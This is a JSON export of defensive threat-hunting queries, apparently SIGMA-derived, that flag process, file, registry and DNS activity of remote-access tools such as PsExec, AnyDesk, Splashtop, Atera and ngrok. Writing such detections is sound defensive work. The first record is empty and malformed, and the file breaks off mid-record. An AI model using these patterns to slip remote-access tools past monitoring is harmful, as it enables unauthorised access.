[
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "```yml",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of Absolute (Computrace) RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Absolute (Computrace) RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"rpcnet.exe\" or src.process.image.path contains \"ctes.exe\" or src.process.image.path contains \"ctespersitence.exe\" or src.process.image.path contains \"cteshostsvc.exe\" or src.process.image.path contains \"rpcld.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 2
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of Splashtop Remote RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Splashtop Remote RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"strwinclt.exe\" or src.process.image.path=\"*Splashtop_Streamer_Windows*.exe\" or src.process.image.path contains \"SplashtopSOS.exe\" or src.process.image.path contains \"sragent.exe\" or src.process.image.path contains \"srmanager.exe\" or src.process.image.path contains \"srserver.exe\" or src.process.image.path contains \"srservice.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 3
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of PSEXEC RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential PSEXEC RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"psexec.exe\" or src.process.image.path contains \"psexecsvc.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 4
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential files activity of AnyDesk RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential AnyDesk RMM Tool File Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"file\" and (endpoint.os=\"windows\" and (tgt.file.path contains \"%programdata%\\AnyDesk\\ad_svc.trace\" or tgt.file.path contains \"%programdata%\\AnyDesk\\connection_trace.txt\" or tgt.file.path contains \"%APPDATA%\\AnyDesk\\connection_trace.txt\" or tgt.file.path contains \"%APPDATA%\\AnyDesk\\ad.trace\" or tgt.file.path contains \"%APPDATA%\\AnyDesk\\chat\\*.txt\" or tgt.file.path contains \"%APPDATA%\\AnyDesk\\user.conf\" or tgt.file.path contains \"%PROGRAMDATA%\\AnyDesk\\service.conf\" or tgt.file.path contains \"%APPDATA%\\AnyDesk\\service.conf\" or tgt.file.path contains \"%APPDATA%\\AnyDesk\\system.conf\" or tgt.file.path contains \"%PROGRAMDATA%\\AnyDesk\\system.conf\" or tgt.file.path contains \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\AnyDesk.lnk\" or tgt.file.path contains \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\AnyDesk\\Uninstall AnyDesk.lnk\" or tgt.file.path contains \"C:\\Users\\*\\Videos\\AnyDesk\\*.anydesk\" or tgt.file.path contains \"C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Roaming\\AnyDesk\\*\" or tgt.file.path contains \"~/Library/Application Support/AnyDesk/Logs/\" or tgt.file.path contains \"~/.config/AnyDesk/Logs/\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 5
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of Atera RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Atera RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\AgentPackageNetworkDiscovery.exe\" or src.process.image.path contains \"\\AgentPackageTaskScheduler.exe\" or src.process.image.path contains \"\\AteraAgent.exe\" or src.process.image.path contains \"atera_agent.exe\" or src.process.image.path contains \"atera_agent.exe\" or src.process.image.path contains \"ateraagent.exe\" or src.process.image.path contains \"syncrosetup.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 6
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of Bitvise SSH Server RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Bitvise SSH Server RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\BvSshServer-Inst.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 7
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of Impero Connect RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Impero Connect RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and (url.address contains \"imperosoftware.com\" or event.dns.request contains \"imperosoftware.com\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 8
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of ngrok RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential ngrok RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and ((url.address contains \"user_managed\" or url.address contains \"ngrok.com\") or (event.dns.request contains \"user_managed\" or event.dns.request contains \"ngrok.com\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 9
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of ESET Remote Administrator RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential ESET Remote Administrator RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and ((url.address contains \"user_managed\" or url.address contains \"eset.com/me/business/remote-management/remote-administrator/\") or (event.dns.request contains \"user_managed\" or event.dns.request contains \"eset.com/me/business/remote-management/remote-administrator/\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 10
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential registry activity of Atera RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Atera RMM Tool Registry Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"Registry\" and (endpoint.os=\"windows\" and (registry.keyPath contains \"HKLM\\SOFTWARE\\ATERA Networks\\AlphaAgent\" or registry.keyPath contains \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\AteraAgent\" or registry.keyPath contains \"KLM\\SOFTWARE\\WOW6432Node\\Splashtop Inc.\" or registry.keyPath contains \"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Splashtop Software Updater\" or registry.keyPath contains \"HKLM\\SYSTEM\\ControlSet\\Services\\EventLog\\Application\\AlphaAgent\" or registry.keyPath contains \"HKLM\\SYSTEM\\ControlSet\\Services\\EventLog\\Application\\AteraAgent\" or registry.keyPath contains \"HKLM\\SOFTWARE\\Microsoft\\Tracing\\AteraAgent_RASAPI32\" or registry.keyPath contains \"HKLM\\SOFTWARE\\Microsoft\\Tracing\\AteraAgent_RASMANCS\" or registry.keyPath contains \"HKLM\\SOFTWARE\\ATERA Networks\\*\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 11
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of Connectwise Automate (LabTech) RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Connectwise Automate (LabTech) RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and (url.address contains \".hostedrmm.com\" or event.dns.request contains \".hostedrmm.com\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 12
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of Impero Connect RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Impero Connect RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"ImperoClientSVC.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 13
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential files activity of Splashtop RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Splashtop RMM Tool File Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"file\" and (endpoint.os=\"windows\" and (tgt.file.path contains \"C:\\windows\\System32\\winevt\\Logs\\Splashtop-Splashtop Streamer-Status%4Operational.evtx\" or tgt.file.path contains \"C:\\windows\\System32\\winevt\\Logs\\Splashtop-Splashtop Streamer-Remote Session%4Operational.evtx\" or tgt.file.path contains \"%PROGRAMDATA%\\Splashtop\\Temp\\log\\FTCLog.txt\" or tgt.file.path contains \"C:\\Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\log\\agent_log.txt\" or tgt.file.path contains \"C:\\Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\log\\SPLog.txt\" or tgt.file.path contains \"C:\\Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\log\\svcinfo.txt\" or tgt.file.path contains \"C:\\Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\log\\sysinfo.txt\" or tgt.file.path contains \"C:\\Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\SRService.exe\" or tgt.file.path contains \"C:\\Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\SRAgent.exe\" or tgt.file.path contains \"C:\\Program Files (x86)\\Splashtop\\Splashtop Software Updater\\SSUAgent.exe\" or tgt.file.path contains \"C:\\Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\SRUtility.exe\" or tgt.file.path contains \"C:\\Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\SRFeature.exe\" or tgt.file.path contains \"C:\\Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\db\\SRAgent.sqlite3\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 14
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential registry activity of Splashtop RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Splashtop RMM Tool Registry Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"Registry\" and (endpoint.os=\"windows\" and (registry.keyPath contains \"KLM\\SOFTWARE\\WOW6432Node\\Splashtop Inc.\\*\" or registry.keyPath contains \"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Splashtop Software Updater\" or registry.keyPath contains \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SplashtopRemoteService\" or registry.keyPath contains \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Splashtop-Splashtop Streamer-Remote Session/Operational\" or registry.keyPath contains \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Splashtop-Splashtop Streamer-Status/Operational\" or registry.keyPath contains \"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Splashtop Software Updater\\InstallRefCount\" or registry.keyPath contains \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\SplashtopRemoteService\" or registry.keyPath contains \"HKU\\.DEFAULT\\Software\\Splashtop Inc.\\*\" or registry.keyPath contains \"HKU\\SID\\Software\\Splashtop Inc.\\*\" or registry.keyPath contains \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers\\Splashtop PDF Remote Printer\" or registry.keyPath contains \"HKLM\\SOFTWARE\\WOW6432Node\\Splashtop Inc.\\Splashtop Remote Server\\ClientInfo\\*\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 15
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential files activity of Atera RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Atera RMM Tool File Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"file\" and (endpoint.os=\"windows\" and (tgt.file.path contains \"C:\\Program Files\\ATERA Networks\\AteraAgent\\Packages\\AgentPackageRunCommandInteractive\\log.txt\" or tgt.file.path contains \"C:\\Program Files\\ATERA Networks\\AteraAgent\\Packages\\*\" or tgt.file.path contains \"C:\\Program Files\\ATERA Networks\\AteraAgent\\AteraAgent.exe\" or tgt.file.path contains \"C:\\Program Files\\Atera Networks\\AlphaAgent.exe\" or tgt.file.path contains \"C:\\Program Files\\ATERA Networks\\AteraAgent\\Packages\\AgentPackageSTRemote\\AgentPackageSTRemote.exe\" or tgt.file.path contains \"C:\\Program Files\\ATERA Networks\\AteraAgent\\Packages\\AgentPackageMonitoring\\AgentPackageMonitoring.exe\" or tgt.file.path contains \"C:\\Program Files\\ATERA Networks\\AteraAgent\\Packages\\AgentPackageHeartbeat\\AgentPackageHeartbeat.exe\" or tgt.file.path contains \"C:\\Program Files\\ATERA Networks\\AteraAgent\\Packages\\AgentPackageFileExplorer\\AgentPackageFileExplorer.exe\" or tgt.file.path contains \"C:\\Program Files\\ATERA Networks\\AteraAgent\\Packages\\AgentPackageRunCommandInteractive\\AgentPackageRunCommandInteractive.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
